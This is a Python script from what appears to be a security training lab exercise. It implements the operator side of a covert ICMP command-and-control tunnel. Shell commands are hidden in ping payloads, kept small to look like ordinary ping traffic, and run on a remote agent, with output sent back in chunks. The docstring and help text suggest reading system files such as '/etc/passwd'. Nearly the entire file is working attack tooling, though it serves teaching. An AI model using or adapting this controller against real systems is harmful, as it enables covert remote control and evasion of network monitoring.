#!/usr/bin/env python3
"""
Module 6 — Exercise 6-A: ICMP C2 Tunnel (Attacker / Controller Side)

Sends commands to a target running icmp_agent.py.
Commands are encoded in ICMP echo request payloads.
Responses come back in ICMP echo reply payloads.

Long commands/responses are chunked across multiple ICMP packets.

Protocol:
  Request:  ICMP echo request  id=SESSION_ID  seq=chunk_index  payload=chunk_data
  Response: ICMP echo reply    id=SESSION_ID  seq=chunk_index  payload=chunk_data

  First byte of each chunk:
    0x01 = data chunk (more follows)
    0x02 = last chunk
    0xFF = error

Usage:
  sudo python3 module6/icmp_tunnel.py --target 192.168.56.2

  Then type commands at the prompt:
    > whoami
    > id
    > ls /etc
    > cat /etc/passwd
    > exit
"""

import argparse
import os
import random
import struct
import sys
import time

from scapy.all import IP, ICMP, Raw, conf

conf.verb = 0
conf.iface = conf.route.route("192.168.56.0")[0]  # default to isolated lab NIC (not Vagrant NAT)

CHUNK_SIZE   = 48     # bytes of payload per ICMP packet (keep under 56 to look like ping)
SESSION_ID   = random.randint(1, 0xFFFF)
TIMEOUT      = 5.0    # seconds to wait for each chunk
MAX_CHUNKS   = 128    # max chunks per command output


# ── Encoding helpers ───────────────────────────────────────────────────────────

def encode_chunk(data: bytes, is_last: bool) -> bytes:
    """Prepend a 1-byte type marker to each chunk."""
    marker = b"\x02" if is_last else b"\x01"
    return marker + data


def decode_chunk(payload: bytes) -> tuple[bytes, bool]:
    """Strip the type marker; return (data, is_last)."""
    if not payload:
        return b"", True
    marker = payload[0]
    return payload[1:], (marker == 0x02 or marker == 0xFF)


# ── Send a command and collect response ───────────────────────────────────────

def send_command(target: str, command: str) -> str:
    """
    Chunk `command` into ICMP echo requests, collect chunked responses,
    return reassembled output string.

    AsyncSniffer starts BEFORE the command is sent so no reply chunks
    are missed due to the execution latency on the agent.
    """
    from scapy.all import AsyncSniffer, send as scapy_send

    chunks_received: dict[int, bytes] = {}
    done = [False]

    def process(pkt):
        if not (pkt.haslayer(ICMP) and pkt.haslayer(Raw)):
            return
        icmp = pkt[ICMP]
        if icmp.type != 0:          # echo reply only
            return
        if icmp.id != SESSION_ID:
            return
        data, is_last = decode_chunk(pkt[Raw].load)
        chunks_received[icmp.seq] = data
        if is_last:
            done[0] = True

    # Start listening BEFORE sending so fast replies are not missed.
    sniffer = AsyncSniffer(
        filter=f"icmp and src host {target}",
        prn=process,
        store=False,
    )
    sniffer.start()
    time.sleep(0.1)     # give the sniffer thread a moment to enter its loop

    # Send command chunks
    cmd_bytes = command.encode()
    cmd_chunks = [cmd_bytes[i:i+CHUNK_SIZE] for i in range(0, len(cmd_bytes), CHUNK_SIZE)]
    if not cmd_chunks:
        cmd_chunks = [b""]

    for seq, chunk in enumerate(cmd_chunks):
        is_last = (seq == len(cmd_chunks) - 1)
        payload = encode_chunk(chunk, is_last)
        pkt = IP(dst=target) / ICMP(id=SESSION_ID, seq=seq, type=8) / Raw(load=payload)
        scapy_send(pkt, verbose=False)
        time.sleep(0.05)

    # Wait up to TIMEOUT seconds for the agent to respond
    deadline = time.time() + TIMEOUT
    while not done[0] and time.time() < deadline:
        time.sleep(0.05)

    sniffer.stop()

    if not chunks_received:
        return "[timeout — no response from agent]"

    output = b""
    for seq in sorted(chunks_received.keys()):
        output += chunks_received[seq]
    return output.decode(errors="replace")


# ── Interactive REPL ──────────────────────────────────────────────────────────

def interactive_shell(target: str):
    print(f"[*] ICMP C2 Tunnel — connected to {target}")
    print(f"[*] Session ID: 0x{SESSION_ID:04X}")
    print("[*] Type 'exit' to quit, 'help' for tips\n")
    print("    NOTE: Agent must be running on target:")
    print(f"    sudo python3 module6/icmp_agent.py --iface eth0\n")

    while True:
        try:
            cmd = input(f"[{target}]> ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\n[*] Exiting")
            break

        if not cmd:
            continue
        if cmd.lower() in ("exit", "quit"):
            break
        if cmd.lower() == "help":
            print("  Commands run on target via ICMP. Examples:")
            print("  whoami, id, uname -a, ls /etc, cat /etc/passwd")
            continue

        print("[*] Sending command...")
        result = send_command(target, cmd)
        print(result)


def main():
    parser = argparse.ArgumentParser(description="ICMP C2 tunnel controller")
    parser.add_argument("--target", required=True, help="Target IP (agent must be running)")
    parser.add_argument("--cmd",    default=None, help="Single command (non-interactive)")
    args = parser.parse_args()

    if args.cmd:
        result = send_command(args.target, args.cmd)
        print(result)
    else:
        interactive_shell(args.target)


if __name__ == "__main__":
    main()
